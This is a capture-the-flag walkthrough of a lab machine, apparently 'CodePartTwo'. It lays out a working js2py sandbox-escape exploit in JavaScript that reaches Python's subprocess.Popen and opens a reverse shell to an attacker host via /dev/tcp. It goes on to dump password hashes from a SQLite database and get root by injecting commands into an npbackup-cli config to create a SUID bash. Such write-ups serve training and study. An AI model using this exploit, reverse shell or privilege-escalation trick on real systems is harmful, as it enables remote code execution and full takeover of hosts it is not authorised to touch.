# scan ports 

nmap -sV -sC 10.10.11.82

> i found ssh and http open in port 8000 ! i opend the website in the port 8000 i didnt found any request or anything intesting thing i registerd into the website and logined with this account i found that we can download the source code of this website and there is another page that run js code that intersting! after i downoaded the source code file i found app.py when i read it i found the website uses sqlite3 db  i cheked it but it has no data thats normaly  but not normal in easy machines XD anyways i read the backend code i realized that website use full python backend and he convert the js code to python py js2py module in the first lines he disabled importing objects directly from python so we have to find any way to exploit it i created an exploit we can use it 

# js2py rce exploit

> explain: if we cant import an object if its disbled we can run it from builtin methods from python and import the class we need from all classes in the app that it use and inject our command to the right class

# example of the exploit

```
// created by skaw
// Put your command here, you can make reverse shell
let command = "bash -c 'bash -i >& /dev/tcp/YOUR_IP_HERE/LISTNER_PORT 0>&1'"; 
// Any object; we just want it to go into the parent classes
let empty = Object.getOwnPropertyNames({}); 
 // Put dot in the object to bypass any filter and call this with any method without errors
let dot_attr = empty.__getattribute__;
// Get the class of the object Get the parent class of the class we got
let father_class = dot_attr("__class__").__base__;
// A list of classes currently loaded in memory
let classes_list = father_class.__subclasses__(); 
let Popen = null; // The class that can run a command on the system

// Get the class we need
for(let i in classes_list) {
    let cls = classes_list[i]
    if (cls.__module__ == "subprocess" && cls.__name__ === "Popen") { // Put here any class that can run a command in the system
        Popen = cls; 
        break; 
    } 
}

// If the class exists
if (Popen){ 
    Popen(command, -1, null, -1, -1, -1, null, null, true).communicate(); 
} else { 
    console.log("Check if Popen is used, or just edit this source code and find the the right class from classes list that can execute any command on the system"); 
}
```

- you can type any command you need its not just reverse shell command



- we can now open listner

> and put our code exploit into run code page and we will have a reverse shell! after that we can go to the place where is the database was and read it

```
app@codeparttwo:~/app$ ls
ls
app.py
instance
__pycache__
requirements.txt
static
templates
app@codeparttwo:~/app$ cd instance
cd instance
app@codeparttwo:~/app/instance$ sqlite3 users.db
sqlite3 users.db
.tables
code_snippet  user        
SELECT * FROM user;
```

> it shows it the users name and it passwords with md5 hash format we can get the password by bruting force from any list use any tool i use dcode website we can login with our username and password we get and boom we have user.txt 

# privesc


- ok i tired to see whats apps that has an high suid privlaged 

```
find / -perm 4000  2>/dev/null 
```

anyways it didnot result anything so i tiers to see if any app uses sudo 

```
sudo -l
```

> and yea its reaslt npbackup-cli so we must find any way to make it excute command bc it has root privlage  and we have already config file called npbackup.conf after reading that i realized we can put our command we need to this place we can copy a privlaged mode of /bin/bash to directory and after that run it from the snapshotsaved after backeup so in post_exec_commands: [] in the square brckits type this command /bin/cp /bin/bash /tmp/anyname; /bin/chmod +s /tmp/anyname for example 

```
post_exec_commands: [/bin/cp /bin/bash /tmp/root; /bin/chmod +s /tmp/root]
```

> /bin/cp is the copy program binary and we copy the /bin/bash to /tmp/root in this example and after that we use /bin/chmod +s /tmp/root to give /tmp/root the suid of the npbackup-cli wich  is 0 (root)

- ok after that we can backup that config file with npbackup-cli

```
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b 
```

- -c = config , -b = backup :)

and after backup completed we can now enter the root anytimes we want when we run /tmp/root -p you must use -p to save your id with bash

```
/tmp/root -p
```

```
cat /root/root.txt
```
